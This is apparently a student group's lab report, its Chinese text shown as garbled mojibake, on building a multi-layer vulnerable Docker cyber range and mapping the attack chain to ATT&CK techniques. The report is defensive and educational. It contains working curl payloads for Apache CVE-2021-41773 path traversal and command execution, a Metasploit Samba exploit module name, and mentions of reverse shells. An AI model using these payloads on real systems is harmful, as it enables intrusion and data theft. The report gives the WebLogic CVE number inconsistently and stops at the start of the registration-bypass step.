# ç½‘å®‰å®è·µï¼šä¸‹åŠåœºæ€»æµç¨‹

## å°ç»„æˆå‘˜åŠåˆ†å·¥
**å°šä½³æ…§**ï¼šè´Ÿè´£é•œåƒé€‰æ‹©ä¸é¶åœºè®¾è®¡ï¼Œè¿›è¡Œé•œåƒæµ‹è¯•ï¼ŒAttack Navigator æ ‡æ³¨ï¼Œä»¥åŠæŠ¥å‘Šæ±‡æ€»ã€‚

**å­™ç‘¢æ‰**ï¼šè¿›è¡Œé•œåƒæµ‹è¯•ï¼Œå¯¹å…¥å£é¶æ ‡è¿›è¡Œæ”»å‡»ä¸åˆ©ç”¨æ£€æµ‹ï¼Œå…¥å£æ¼æ´ç¼“è§£ã€‚ 

**å¼ ç¿** :  å…¨é“¾è·¯æ”»å‡»

**ä¸æ¢¦**ï¼šå¯¹ç¬¬ä¸€å±‚å’Œç¬¬äºŒå±‚çš„å››ä¸ªé¶æ ‡è¿›è¡Œåˆ©ç”¨æ£€æµ‹ã€‚ 

**é™ˆæœ—**ï¼šå¯¹ç¬¬ä¸‰å±‚çš„ä¸€ä¸ªé¶æ ‡è¿›è¡Œåˆ©ç”¨æ£€æµ‹ï¼Œå…¥å£æ¼æ´çš„ç¼“è§£ã€‚ 

**æ¨å®‡å©·**ï¼šå…¥å£æ¼æ´çš„ç¼“è§£ä¸ä¿®å¤

### ğŸ† é¶åœºå»ºè®¾ä»»åŠ¡å®ŒæˆæŠ¥å‘Š ğŸ†
```diff
+ æ‰€æœ‰ä»»åŠ¡ 100% å®Œæˆ +
```

| ä»»åŠ¡æè¿°         | çŠ¶æ€   | è¿›åº¦å¯è§†åŒ–               |
|------------------|--------|--------------------------|
| ğŸŒ å†…éƒ¨å­ç½‘æ­å»º   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% |
| ğŸ¯ é¶æ ‡æ›´æ¢éƒ¨ç½²   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% | 
| ğŸ”— æ”»å‡»é“¾è·¯éªŒè¯   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% |
| ğŸ” æ¼æ´åˆ©ç”¨æ£€æµ‹   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% |
| ğŸ›¡ï¸ æ¼æ´ç¼“è§£ç­–ç•¥   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% | 
| âœ¨ æ¼æ´å®Œå…¨ä¿®å¤   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% |
| ğŸ“Š ATT&CKå¯è§†åŒ–   | âœ…  | â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ 100% | 


## å®éªŒç¯å¢ƒ

* kali

* metasploit

* docker

* vulficus

# è‡ªå®šä¹‰é¶åœºè®¾è®¡
åœ¨è®¾è®¡é¶åœºæ—¶ï¼Œæˆ‘ä»¬çš„ç›®æ ‡å¦‚ä¸‹ï¼š
* æ„å»ºå¤šç½‘æ®µã€æœ‰éš”ç¦»ç­–ç•¥çš„ç½‘ç»œç¯å¢ƒï¼ˆå†…ç½‘ã€å¤–ç½‘ã€DMZï¼‰
* æ¶µç›–åƒâ€œåˆå§‹è®¿é—®â€â€œæ¨ªå‘ç§»åŠ¨â€ç­‰ç¯èŠ‚
* æ”¯æŒçº¢é˜Ÿå®Œæˆå¤šæ¡æ”»å‡»é“¾ï¼ˆåˆå§‹è®¿é—®ã€ææƒã€æ¨ªç§»ã€æŒä¹…åŒ–ç­‰ï¼‰
* æ”¯æŒè“é˜Ÿå…¨ç¨‹æ£€æµ‹ã€ç›‘æ§ã€æº¯æºï¼ˆæµé‡ã€æ—¥å¿—ã€å‘Šè­¦ï¼‰


æˆ‘ä»¬å…ˆå¯åŠ¨vulfocusé•œåƒã€‚

![alt text](./image/1748090564315.png)

æ¥ä¸‹æ¥æˆ‘ä»¬é€‰æ‹©ç¬¦åˆè¦æ±‚ï¼Œèƒ½å¤ŸæˆåŠŸå¯åŠ¨ï¼ŒåŒæ—¶å…·æœ‰æ˜“äºæ”»å‡»çš„ç‰¹æ€§çš„é•œåƒã€‚é€šè¿‡è¯¢é—®å¤§æ¨¡å‹ï¼Œæˆ‘ä»¬åœ¨vulfocusä¸Šæ‹‰å–æ•°ä¸ªé•œåƒè¿›è¡Œæµ‹è¯•ã€‚

ç»è¿‡å¯åŠ¨æµ‹è¯•ï¼Œæ’é™¤æ‰äº†ä¸€äº›æ— æ³•æ­£å¸¸å¯åŠ¨çš„é•œåƒï¼Œæœ€åé€‰æ‹©å¦‚ä¸‹çš„é•œåƒè¿›è¡Œæ‹“æ‰‘æ­å»ºã€‚

åŒæ—¶ï¼Œæˆ‘ä»¬è®¾è®¡ç½‘å¡å¦‚ä¸‹ï¼š

![alt text](./image/1748091359862.png)

![alt text](./image/1748091090316.jpg)

![alt text](./image/1748223841631.png)

## æ¶‰åŠæ¼æ´æ¦‚è§ˆ

| é˜¶æ®µ   | å®¹å™¨é•œåƒ              | æ¼æ´ç±»å‹        | åˆ©ç”¨æ–¹å¼            |
| ---- | ----------------- | ----------- | --------------- |
| åˆå§‹   | wordpress_cve-2021-21389     | å‚ç›´è¶Šæƒæ¼æ´      | è·å–é«˜æƒé™åå°æ§åˆ¶       |
| æ¨ªå‘ç§»åŠ¨ | vulshare_nginx-php-flag | æ–‡ä»¶ä¸Šä¼ /å…±äº«æ¼æ´   | ä¸Šä¼ å·¥å…·ï¼Œä¿¡æ¯æ³„éœ²ã€è¾…åŠ©ææƒ  |
| æ¨ªå‘ç§»åŠ¨ | samba-cve_2017_7494          | è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´    | åŠ è½½æ¶æ„å…±äº«æ–‡ä»¶ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œ |
| æ ¸å¿ƒæ¸—é€ | weblogic-cve_2019_2725  | è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ | ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œæ§åˆ¶ä¸­é—´ä»¶å®¹å™¨  |
| æ ¸å¿ƒæ¸—é€ | apache-cve_2021_41773 | è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰ | å‘½ä»¤æ‰§è¡Œï¼Œæ·±å…¥ä¸»æœº       |
| æ·±åº¦æ¸—é€ | thinkphp-cve_2018_1002015    | å‘½ä»¤æ‰§è¡Œæ¼æ´      | æ‰§è¡Œå‘½ä»¤ï¼Œè®¿é—®æ•°æ®åº“æˆ–æŒä¹…æ§åˆ¶ |

æµ‹è¯•æ˜¯å¦èƒ½å¤Ÿæ­£å¸¸å¯åŠ¨ï¼Œå¾…æˆ‘ä»¬ç¼–æ’å¥½çš„åœºæ™¯å‘å¸ƒåï¼Œå°è¯•å¯åŠ¨åœºæ™¯ï¼Œå¯ä»¥æˆåŠŸå¯åŠ¨å³ä¸ºæˆåŠŸã€‚

![alt text](./image/1748089490210-1.png)

## Attack Navigatorå¯è§†åŒ–

![alt text](./image/02b7151196cffe900f96f4f7aeb7f5d.png)

**å¯è§jsonæ–‡ä»¶ã€‚**

### å…·ä½“æŠ€æœ¯ç‚¹è§£é‡Š

#### å…¥å£é¶æ ‡ï¼šwordpress_cve-2021-21389:latest

  **ç¬¬ä¸€é˜¶æ®µï¼šæ³¨å†Œç»•è¿‡ï¼ˆé€»è¾‘æ¼æ´åˆ©ç”¨ï¼‰**

**æŠ“åŒ…æ³¨å†Œè¯·æ±‚ â†’ æå–æ¿€æ´»å¯†é’¥ â†’ æ„é€ æ¿€æ´»è¯·æ±‚**

* **T1190 â€“ Exploit Public-Facing Application**
  WordPress æ³¨å†Œé€»è¾‘å­˜åœ¨ç¼ºé™·ï¼Œå…è®¸æ”»å‡»è€…ç»•è¿‡æ¿€æ´»éªŒè¯ï¼Œå±äºå…¸å‹å…¬å…± Web åº”ç”¨åˆ©ç”¨ã€‚

* **T1556.003 â€“ Modify Authentication Process: Web Portal Capture**
  æ„é€ æ¿€æ´»è¯·æ±‚ã€ç»•è¿‡æ ‡å‡†éªŒè¯æµç¨‹ï¼Œå±äºè®¤è¯é€»è¾‘ç¯¡æ”¹ã€‚

* **T1071.001 â€“ Application Layer Protocol: Web**
  ä½¿ç”¨ HTTP æŠ“åŒ…ä¸é‡æ”¾æ”»å‡»ï¼ˆburp suite æ“ä½œï¼‰å‡åŸºäº Web åè®®é€šä¿¡ã€‚

---

**ç¬¬äºŒé˜¶æ®µï¼šè·å–ç®¡ç†å‘˜æƒé™ï¼ˆæƒé™æå‡ï¼‰**

**åˆ›å»ºç”¨æˆ·ç»„ â†’ è®¿é—® `/groups/create/...` åˆ›å»ºç»„ â†’ ç”¨æˆ·è¢«åŠ å…¥ç»„**

* **T1098.001 â€“ Account Manipulation: Additional Cloud Credentials / Privilege Grant**
  åˆ›å»ºç»„çš„è¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…å°†è‡ªå·±çš„è´¦æˆ·æ¤å…¥ç‰¹å®šæƒé™ç»„ï¼Œè§¦å‘æƒé™æå‡é€»è¾‘ã€‚

---

**æŠ“åŒ… manage/members è¯·æ±‚ â†’ æå– X-WP-Nonce ä¸ Cookie å‚æ•°**

* **T1557.002 â€“ Man-in-the-Middle: ARP Cache Poisoning / Traffic Interception**
  è™½ç„¶ä¸æ˜¯å…¸å‹çš„ç½‘ç»œä¸­é—´äººï¼Œä½†æŠ“åŒ…å·¥å…·ï¼ˆå¦‚ Burpï¼‰æœ¬è´¨ä¸Šæ‹¦æˆªäº†ç”¨æˆ·ä¸ Web åº”ç”¨é—´é€šä¿¡ã€‚

* **T1110.001 â€“ Brute Force: Password Guessing (å¼±åŒ¹é…)**
  éå¸¸è½»å¾®é€‚ç”¨ï¼šä½¿ç”¨æš´åŠ›æ–¹å¼çŒœæµ‹éæ ‡å‡†æ¥å£å‚æ•°æˆ– tokenï¼ˆå¦‚å°è¯•è·å– X-WP-Nonceï¼‰

---

**æ„é€  POST è¯·æ±‚ â†’ `wp-json/buddypress/v1/members/me` â†’ ææƒ**

* **T1068 â€“ Exploitation for Privilege Escalation**
  æ„é€ ææƒè¯·æ±‚å±äºåˆ©ç”¨åº”ç”¨å†…éƒ¨çš„æƒé™æ¼æ´ç›´æ¥è·å–æ›´é«˜æƒé™ã€‚

* **T1078.003 â€“ Valid Accounts: Local Accounts**
  åˆ©ç”¨æœ‰æ•ˆç”¨æˆ·èº«ä»½ + X-WP-Nonce ææƒã€‚

---

**ç™»å½•åå°éªŒè¯ææƒæ•ˆæœ â†’ è®¿é—® dashboard é¡µé¢**

* **T1087.001 â€“ Account Discovery: Local Account**
  ç™»å½•åç¡®è®¤è´¦æˆ·æƒé™æ˜¯å¦ä¸º adminï¼Œå³æ˜¯å¯¹æœ¬åœ°è´¦æˆ·æƒé™çš„æ¢æµ‹è¡Œä¸ºã€‚

---

| Technique ID | Technique Name                                     | é˜¶æ®µ          | è¯´æ˜                     | æ¨èé¢œè‰²      |
| ------------ | -------------------------------------------------- | ----------- | ---------------------- | --------- |
| T1190        | Exploit Public-Facing Application                  | æ³¨å†Œç»•è¿‡        | WordPress æ¿€æ´»æµç¨‹æ¼æ´åˆ©ç”¨     | `#ff9999` |
| T1556.003    | Modify Authentication Process: Web Portal Capture  | æ³¨å†Œç»•è¿‡        | ä¼ªé€ æ¿€æ´»è¯·æ±‚ç»•è¿‡éªŒè¯æµç¨‹           | `#ffcc99` |
| T1071.001    | Application Layer Protocol: Web                    | æ³¨å†Œ/ææƒè¯·æ±‚å‘é€é˜¶æ®µ | æ‰€æœ‰ burp æ“ä½œé€šè¿‡ HTTP æ¥å£æ„é€  | `#cccccc` |
| T1098.001    | Account Manipulation: Additional Cloud Credentials | åˆ›å»ºç”¨æˆ·ç»„       | åˆ©ç”¨åˆ†ç»„æœºåˆ¶å°†ç”¨æˆ·æƒé™æŠ¬å‡          | `#66cccc` |
| T1557.002    | Man-in-the-Middle: Traffic Interception            | æŠ“åŒ…ææƒè¯·æ±‚      | Burp æŠ“åŒ…æ‹¦æˆª token ä¿¡æ¯     | `#ffdd99` |
| T1068        | Exploitation for Privilege Escalation              | æ„é€ ææƒè¯·æ±‚      | ç”¨æ¥å£æ¼æ´æå‡è§’è‰²ä¸ºç®¡ç†å‘˜          | `#ffa07a` |
| T1078.003    | Valid Accounts: Local Accounts                     | ç™»å½•åå°        | ä½¿ç”¨å·²æœ‰è´¦æˆ·è®¿é—®ç®¡ç†åå°           | `#ffff99` |
| T1087.001    | Account Discovery: Local Account                   | æƒé™éªŒè¯        | éªŒè¯ dashboard é¡µé¢åŠŸèƒ½æ˜¯å¦æ–°å¢  | `#ccffcc` |

---

#### ç¬¬ä¸€å±‚é¶æ ‡ï¼šsamba-cve_2017_7494:latest

åˆ©ç”¨metasploitã€‚

| æ­¥éª¤ | æ“ä½œè¯´æ˜                                                                         |
| -- | ---------------------------------------------------------------------------- |
| â‘   | åˆ©ç”¨ `exploit/linux/samba/is_known_pipename` æ¨¡å—è§¦å‘æ¼æ´                            |
| â‘¡  | è®¾ç½® payloadç›¸å…³å‚æ•° |
| â‘¢  | å¯åŠ¨ç›‘å¬å™¨ï¼Œè·å–åå¼¹ shellï¼ˆMeterpreter / Bash / Netcatï¼‰                                |
| â‘£  | åœ¨ shell ä¸­æ‰§è¡Œå‘½ä»¤ã€ææƒã€æŒä¹…åŒ–                                                         |

---

| Technique ID  | Technique Name                                                  | é˜¶æ®µ       | è¯´æ˜                                                  |
| ------------- | --------------------------------------------------------------- | -------- | --------------------------------------------------- |
| **T1203**     | **Exploitation for Client Execution**                           | æ‰§è¡Œ       | Metasploit åˆ©ç”¨æ¼æ´æ¨¡å—ï¼ˆæ¯”å¦‚ `samba/is_known_pipename`ï¼‰è¿›è¡Œè§¦å‘ |
| **T1059.004** | **Command and Scripting Interpreter: Unix Shell**               | æ‰§è¡Œ       | è·å– shell åï¼Œé€šè¿‡ Unix shell æ‰§è¡Œå‘½ä»¤                       |
| **T1053.003** | **Scheduled Task/Job: Cron**                                  | æƒé™ç»´æŒ | æ”»å‡»è€…å¯åˆ›å»º cron æŒä¹…åŒ–ä»»åŠ¡ï¼ˆå¦‚åå¼¹ shell æŒç»­å­˜åœ¨ï¼‰                   |

---

#### ç¬¬ä¸€å±‚é¶æ ‡ï¼švulshare_nginx-php-flag

**æ”»å‡»æŠ€æœ¯ç‚¹**

| ATT\&CK æŠ€æœ¯ ID | æŠ€æœ¯åç§°                                                 | æ”»å‡»é˜¶æ®µ | è¡Œä¸ºæè¿°                               |
| ------------- | ---------------------------------------------------- | ---- | ---------------------------------- |
| **T1203**     | Exploitation for Client Execution                    | æ‰§è¡Œ   | ç›´æ¥é€šè¿‡ `cmd` å‚æ•°è§¦å‘å‘½ä»¤æ‰§è¡Œæ¼æ´              |
| **T1059.001** | Command and Scripting Interpreter: PowerShell / Bash | æ‰§è¡Œ   | åœ¨ URL å‚æ•°ä¸­æ‰§è¡Œ Linux å‘½ä»¤ï¼ˆå¦‚ `ls`ã€`cat`ï¼‰ |
| **T1040**     | Network Sniffing                                     | ä¾¦å¯Ÿ   | å¯ä»¥åœ¨å®¹å™¨å†…æŠ“å–è®¿é—®æ—¥å¿—æˆ–åŒ…æ¥æ£€æµ‹æ”»å‡»è¡Œä¸º              |
| **T1595.002** | Active Scanning: Vulnerability Scanning              | ä¾¦å¯Ÿ   | æ”»å‡»è€…å¯èƒ½é€šè¿‡ Fuzz å‘ç° index.php æ¥æ”¶å‚æ•°     |

---

#### ç¬¬äºŒå±‚é¶æ ‡ï¼š WebLogic â€“ CVE-2020-2555

* æ¢æµ‹ WebLogic æ§åˆ¶å°ç«¯å£
* æ„é€  T3 ååºåˆ—åŒ– Payload è·å–åå¼¹ Shell æˆ– flag
* ç›‘å¬å¹¶åˆ†æç½‘ç»œæµé‡ã€æ—¥å¿—ç¡®è®¤åˆ©ç”¨æ˜¯å¦æˆåŠŸ

| ATT\&CK æŠ€æœ¯ ID | æŠ€æœ¯åç§°                                            | é˜¶æ®µ   | è¯´æ˜                              |
| ------------- | ----------------------------------------------- | ---- | ------------------------------- |
| **T1190**     | Exploit Public-Facing Application               | åˆå§‹è®¿é—® | é€šè¿‡ååºåˆ—åŒ–æ¼æ´æ”»å‡» WebLogic             |
| **T1059.005** | Command and Scripting Interpreter: Visual Basic | æ‰§è¡Œ   | åˆ©ç”¨ T3 Payload æ‰§è¡Œæ¶æ„å‘½ä»¤            |
| **T1210**     | Exploitation of Remote Services                 | æ¨ªå‘ç§»åŠ¨ | è‹¥æ”»å‡»è€…é€šè¿‡åå¼¹ Shell è·å–æ§åˆ¶æƒé™ï¼Œå¯è¿›ä¸€æ­¥æ”»å‡»å†…ç½‘  |
| **T1040**     | Network Sniffing                                | ä¾¦å¯Ÿ   | Wireshark æŠ“åŒ…åˆ†ææ˜¯å¦å­˜åœ¨ T3 é€šä¿¡æˆ–æ¶æ„å‘½ä»¤æµé‡ |
| **T1005**     | Data from Local System                          | æ”¶é›†   | è¯»å– flag æ–‡ä»¶ä½œä¸ºé¶åœºç›®æ ‡                |
| **T1057**     | Process Discovery                               | å‘ç°   | è‹¥æ”»å‡»è€…æ¢æµ‹è¿è¡ŒæœåŠ¡ã€è¿›ç¨‹ç­‰ä¿¡æ¯                |

---

#### ç¬¬äºŒå±‚é¶æ ‡ï¼šApache â€“ CVE-2021-41773

* ä½¿ç”¨ curl http://ip:port/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd è¿›è¡Œè·¯å¾„ç©¿è¶Šè¯»å–
* ä½¿ç”¨åŒæ ·æ–¹å¼è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼šå¦‚ curl 'http://ip/cgi-bin/.%2e/.%2e/.%2e/bin/sh -c "cat /flag"'
* åœ¨æœåŠ¡å™¨ç«¯åˆ†æ apache è®¿é—®æ—¥å¿—ï¼Œä½¿ç”¨ tail -f access_log | grep ".."

###  ATT\&CK Navigator æ ‡æ³¨ï¼š

| ATT\&CK æŠ€æœ¯ ID | æŠ€æœ¯åç§°                                            | é˜¶æ®µ   | è¯´æ˜                       |
| ------------- | ----------------------------------------------- | ---- | ------------------------ |
| **T1190**     | Exploit Public-Facing Application               | åˆå§‹è®¿é—® | Apache è·¯å¾„ç©¿è¶Šä¸å‘½ä»¤æ‰§è¡Œ         |
| **T1083**     | File and Directory Discovery                    | å‘ç°   | ä½¿ç”¨è·¯å¾„ç©¿è¶Šæ¼æ´æŸ¥çœ‹æœåŠ¡å™¨æ–‡ä»¶ç³»ç»Ÿç»“æ„      |
| **T1059.004** | Command and Scripting Interpreter: Unix Shell   | æ‰§è¡Œ   | æ‰§è¡Œå¦‚ `cat /flag` å‘½ä»¤è·å–æ•æ„Ÿæ•°æ® |
| **T1040**     | Network Sniffing                                | ä¾¦å¯Ÿ   | ä½¿ç”¨ Wireshark æŠ“å–è¯·æ±‚        |
| **T1005**     | Data from Local System                          | æ”¶é›†   | è¯»å– flag æ–‡ä»¶               |


#### æœ€ç»ˆå±‚é¶æ ‡ï¼švulfocus/thinkphp-cve_2018_1002015 â€”â€” ThinkPHP æ¡†æ¶è¿œç¨‹ä»£ç æ‰§è¡Œ

| ATT\&CK æŠ€æœ¯ ID | æŠ€æœ¯åç§°                                          | æ”»å‡»é˜¶æ®µ | è¡Œä¸ºæè¿°                               |
| ------------- | --------------------------------------------- | ---- | ---------------------------------- |
| **T1190**     | Exploit Public-Facing Application             | åˆå§‹è®¿é—® | RCE åˆ©ç”¨çš„æ˜¯å…¬å¼€æœåŠ¡æ¥å£ï¼ˆThinkPHP è·¯ç”±è§£ææ¼æ´ï¼‰    |
| **T1059.004** | Command and Scripting Interpreter: Unix Shell | æ‰§è¡Œ   | æ„é€  Payload æ‰§è¡Œå‘½ä»¤                    |
| **T1082**     | System Information Discovery                  | å‘ç°   | ä½¿ç”¨ `id`ã€`whoami`ã€`uname` ç­‰å‘½ä»¤ç¡®è®¤æ‰§è¡Œèº«ä»½ |
| **T1005**     | Data from Local System                        | æ”¶é›†   | è¯»å–æœ¬åœ° `flag` æ–‡ä»¶å±äºæ•æ„Ÿä¿¡æ¯è·å–             |




## å„é•œåƒå•ç‹¬å¯åŠ¨æµ‹è¯•
**1. wordpress_cve-2021-21389:latestï¼ˆwordpresså‚ç›´è¶Šæƒï¼‰**
* CVE-2021-21389 æ˜¯ WordPress æ ¸å¿ƒä»£ç ä¸­ä¸€ä¸ªå› æƒé™éªŒè¯ä¸ä¸¥å¯¼è‡´çš„å‚ç›´è¶Šæƒæ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ­¤æ¼æ´ä»¥ä½æƒé™ç”¨æˆ·èº«ä»½æ‰§è¡Œæœ¬åº”ä»…é™ç®¡ç†å‘˜æˆ–é«˜æƒé™ç”¨æˆ·çš„æ“ä½œã€‚

* BuddyPress æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºç¤¾åŒºç«™ç‚¹çš„WordPressæ’ä»¶ã€‚å½“BuddyPresså¤„äº5.0.0-7.2.1æ—¶ï¼Œéç‰¹æƒç”¨æˆ·å¯ä»¥é€šè¿‡åˆ©ç”¨REST API æˆå‘˜ç«¯ç‚¹ï¼ˆBuddyPressä¸­ç”¨äºç®¡ç†æˆå‘˜æ•°æ®çš„APIæ¥å£ï¼‰ä¸­çš„é—®é¢˜æ¥è·å¾—ç®¡ç†å‘˜æƒé™ã€‚

![alt text](./image/1748185515738.png)

**2. c4pr1c3/vulshare_nginx-php-flag:latest**
* å‘½ä»¤æ‰§è¡Œï¼ˆCommand Executionï¼‰æ¼æ´ï¼Œå³é»‘å®¢å¯ä»¥ç›´æ¥åœ¨Webåº”ç”¨ä¸­æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–è€…æ‹¿ä¸‹shellæƒé™ å‘½ä»¤æ‰§è¡Œæ¼æ´å¯èƒ½é€ æˆçš„åŸå› æ˜¯WebæœåŠ¡å™¨å¯¹ç”¨æˆ·è¾“å…¥å‘½ä»¤å®‰å…¨æ£€æµ‹ä¸è¶³ï¼Œå¯¼è‡´æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚

![alt text](./image/1748185720519.png)

**3. vulfocus/samba-cve_2017_7494:latest**

* Sambaå®ç°Windowsä¸»æœºä¸LinuxæœåŠ¡å™¨ä¹‹é—´çš„èµ„æºå…±äº«ï¼ŒLinuxæ“ä½œç³»ç»Ÿæä¾›äº†SambaæœåŠ¡ï¼ŒSambaæœåŠ¡ä¸ºä¸¤ç§ä¸åŒçš„æ“ä½œç³»ç»Ÿæ¶èµ·äº†ä¸€åº§æ¡¥æ¢ï¼Œä½¿Linuxç³»ç»Ÿå’ŒWindowsç³»ç»Ÿä¹‹é—´èƒ½å¤Ÿå®ç°äº’ç›¸é€šä¿¡ã€‚sambaåœ¨linuxç³»ç»Ÿä¸Šå®ç°SMBåè®®çš„æœåŠ¡ï¼Œä½¿ç”¨SMBåè®®åœ¨å±€åŸŸç½‘ä¸Šå…±äº«æ–‡ä»¶å’Œæ‰“å°æœº.CVE-2017-7494ï¼Œ2017å¹´5æœˆ24æ—¥Sambaå‘å¸ƒäº†4.6.4ç‰ˆæœ¬ï¼Œä¿®å¤ä¸¥é‡çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´å½±å“äº†Samba 3.5.0 ä¹‹ååˆ°4.6.4/4.5.10/4.4.14ä¸­é—´çš„æ‰€æœ‰ç‰ˆæœ¬ï¼Œå¯ä»¥è®©æ¶æ„è®¿é—®è€…è¿œç¨‹æ§åˆ¶å—å½±å“çš„Linuxå’ŒUnixæœºå™¨ã€‚

* æ­¤é•œåƒæ¨¡æ‹Ÿçš„æ˜¯Sambaæ¼æ´æœåŠ¡ï¼Œè€ŒSambaæ˜¯SMBæ–‡ä»¶å…±äº«æœåŠ¡ï¼Œå¹¶éç½‘é¡µæœåŠ¡ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥é€šè¿‡ç½‘é¡µè®¿é—®ç¡®è®¤æ˜¯å¦å¯ä»¥æˆåŠŸå¯åŠ¨ã€‚

æˆ‘ä»¬è¿›å…¥å®¹å™¨å†…éƒ¨ï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨smbdæˆ–è€…nmbdè¿›ç¨‹ã€‚
![alt text](./image/1748186147419.png)


**4. vulfocus/weblogic-cve_2019_2725:latest**
* CVE-2019-2725 æ˜¯ä¸€ä¸ªå½±å“ Oracle WebLogic Server çš„ååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¿™ä¸ªæ¼æ´å…è®¸æœªç»æˆæƒçš„æ”»å‡»è€…é€šè¿‡å‘é€ç²¾å¿ƒæ„é€ çš„æ¶æ„ HTTP è¯·æ±‚æ¥è¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚è¯¥æ¼æ´åˆ©ç”¨äº† WebLogic çš„ XMLDecoder ååºåˆ—åŒ–æ¼æ´ï¼Œé€šè¿‡æ„é€ ç‰¹å®šçš„ payload æ¥ç»•è¿‡ Oracle å®˜æ–¹çš„è¡¥ä¸ã€‚

**5. vulfocus/apache-cve_2021_41773:latest**

* Apache HTTP Server 2.4.49ã€2.4.50ç‰ˆæœ¬å¯¹è·¯å¾„è§„èŒƒåŒ–æ‰€åšçš„æ›´æ”¹ä¸­å­˜åœ¨ä¸€ä¸ªè·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´è¯»å–åˆ°Webç›®å½•å¤–çš„å…¶ä»–æ–‡ä»¶ï¼Œå¦‚ç³»ç»Ÿé…ç½®æ–‡ä»¶ã€ç½‘ç«™æºç ç­‰ï¼Œç”šè‡³åœ¨ç‰¹å®šæƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„è¯·æ±‚æ‰§è¡Œå‘½ä»¤ï¼Œæ§åˆ¶æœåŠ¡å™¨ã€‚

![alt text](./image/1748185876491.png)

**6. vulfocus/thinkphp-cve_2018_1002015:latest**
* ThinkPHP 5.0.xç‰ˆæœ¬å’Œ5.1.xç‰ˆæœ¬ä¸­å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´æºäºThinkPHPåœ¨è·å–æ§åˆ¶å™¨åæ—¶æœªå¯¹ç”¨æˆ·æäº¤çš„å‚æ•°è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ã€‚è¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡è¾“å…¥â€˜ï¼¼â€™å­—ç¬¦çš„æ–¹å¼è°ƒç”¨ä»»æ„æ–¹æ³•åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»£ç ã€‚

![alt text](./image/1748186644232.png)


# æ”»å‡»æ€»æµç¨‹

### æ­¥éª¤ä¸€ï¼šå…¥å£é¶æ ‡æ”»å‡»ï¼ˆWordPress å‚ç›´è¶Šæƒï¼ˆCVE-2021-21389ï¼‰æ¼æ´å¤ç°ï¼‰

* BuddyPress æ˜¯ä¸€ä¸ªç”¨äºæ„å»ºç¤¾åŒºç«™ç‚¹çš„å¼€æº WordPress æ’ä»¶ã€‚åœ¨ 7.2.1 ä¹‹å‰çš„ 5.0.4 ç‰ˆæœ¬çš„ BuddyPress ä¸­ï¼Œéç‰¹æƒæ™®é€šç”¨æˆ·å¯ä»¥é€šè¿‡åˆ©ç”¨ REST API æˆå‘˜ç«¯ç‚¹ä¸­çš„é—®é¢˜æ¥è·å¾—ç®¡ç†å‘˜æƒé™ã€‚è¯¥æ¼æ´å·²åœ¨ BuddyPress 7.2.1 ä¸­ä¿®å¤ã€‚æ’ä»¶çš„ç°æœ‰å®‰è£…åº”æ›´æ–°åˆ°æ­¤ç‰ˆæœ¬ä»¥ç¼“è§£é—®é¢˜ã€‚

#### ï¼ˆä¸€ï¼‰ç¯å¢ƒæ­å»º
1. **æ‹‰å–æ‰€éœ€é•œåƒ**
   ```bash
   docker pull vulfocus/wordpress_cve-2021-21389:latest
   docker pull vulfocus/thinkphp-cve_2018_1002015:latest
   docker pull vulfocus/samba-cve_2017_7494:latest 
   docker pull c4pr1c3/vulshare_nginx-php-flag:latest
   docker pull vulfocus/apache-cve_2021_41773
   docker pull vulfocus/weblogic-cve_2020_2555
   ```
   ![1747473863077](image/homework/1747473863077.png)
   ![1747473881917](image/homework/1747473881917.png)
   ![1747473893030](image/homework/1747473893030.png)
   ![1747473905026](image/homework/1747473905026.png)
   ![1747648013574](image/homework/1747648013574.png)

2. **å¯åŠ¨vulfucusç¯å¢ƒ**
![1747896129453](image/readme/1747896129453.png)
![1747896152092](image/readme/1747896152092.png)

3. **åœºæ™¯æ­å»º&å¯åŠ¨åœºæ™¯**
![1748168018019](image/readme/1748168018019.png)

4. **æ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®åœºæ™¯åœ°å€**
![1747897882478](image/readme/1747897882478.png)

#### ï¼ˆäºŒï¼‰æ³¨å†Œç»•è¿‡
1. **æŠ“åŒ…æ³¨å†Œè¯·æ±‚**
